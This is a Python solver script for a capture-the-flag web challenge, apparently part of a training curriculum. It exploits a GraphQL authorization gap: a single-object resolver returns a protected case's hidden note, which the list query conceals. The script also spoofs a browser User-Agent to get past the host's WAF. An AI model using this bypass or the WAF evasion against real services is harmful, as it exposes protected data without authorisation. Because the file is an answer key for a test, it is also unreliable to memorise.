#!/usr/bin/env python3
"""Resolver Revolt (day-25 web-exploitation, curriculum day 18) - GraphQL field-level
authorization bypass.

Stdlib only; talks only to the one target origin given on the command line. Never
touches the Game Master (no HUNTRESS_GM_TOKEN, no start/submit).

The app ("Graph Garden", GraphQL.js) discloses via `GET /api/clues`:
    {"current_user": "analyst", "feature_route": "/inspect-<hex>",
     "protected_reference": "<id>", "note": "..."}

`feature_route` is a live GraphQL endpoint (POST, Content-Type: application/json,
body {"query": "..."}). Schema (confirmed via a standard introspection query - note
that a bare `Python-urllib/*` User-Agent gets 403'd by the edge WAF on this host, so
every request here sends a browser-like UA):

    type CaseReference { id: ID!, title: String!, visibility: String! }
    type Case           { id: ID!, title: String!, note: String! }
    type Query {
        caseIndex: [CaseReference]!      # list surface - hides `note`, shows `visibility`
        case(id: ID!): Case              # single-object surface - exposes `note` directly
    }

The bug: the authorization discipline (hide the note/proof on protected references,
e.g. visibility "reference only") is enforced consistently on the *list* surface
(`caseIndex` never exposes `note` at all), but the single-object resolver `case(id)`
has no field-level check at all - querying it directly for the `protected_reference`
id returns `note` containing `proof_<hex>` with no additional bypass needed. "Vary
the protocol surface" = move from the list query to the single-object query; the
HTTP transport (POST JSON) does not need to change.

Confirmed on live single_solve and time_trial targets (release day 25).
"""
import json
import re
import sys
import urllib.error
import urllib.request

UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")  # bare urllib UA gets WAF 403'd
TIMEOUT = 30
PROOF_RE = re.compile(r"proof_[0-9a-fA-F]{16,}")


def _request(url, method="GET", data=None):
    body = json.dumps(data).encode() if data is not None else None
    headers = {"User-Agent": UA}
    if data is not None:
        headers["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as err:
        return err.code, err.read().decode("utf-8", "replace")


def graphql(base, feature_route, query):
    status, body = _request(base + feature_route, "POST", {"query": query})
    if status != 200:
        return status, None
    try:
        return status, json.loads(body)
    except ValueError:
        return status, None


def solve(base):
    base = base.rstrip("/")
    status, body = _request(base + "/api/clues")
    if status != 200:
        raise SystemExit(f"GET /api/clues failed: {status} {body!r}")
    clues = json.loads(body)
    feature_route = clues["feature_route"]
    protected_reference = clues["protected_reference"]

    # Confirm the list surface hides the field (evidence only, not required for the proof).
    status, idx = graphql(base, feature_route, "{ caseIndex { id title visibility } }")
    if status == 200 and idx:
        print("caseIndex:", json.dumps(idx.get("data", {}).get("caseIndex")))

    status, obj = graphql(
        base, feature_route,
        'query { case(id: "%s") { id title note } }' % protected_reference)
    if status != 200 or not obj:
        raise SystemExit(f"case({protected_reference!r}) query failed: {status} {obj!r}")
    note = (obj.get("data") or {}).get("case", {}).get("note", "")
    match = PROOF_RE.search(note)
    if not match:
        raise SystemExit(f"no proof in case.note: {obj!r}")
    return match.group(0)


if __name__ == "__main__":
    if len(sys.argv) != 2:
        raise SystemExit(f"usage: {sys.argv[0]} <target_base_url>")
    print(solve(sys.argv[1]))
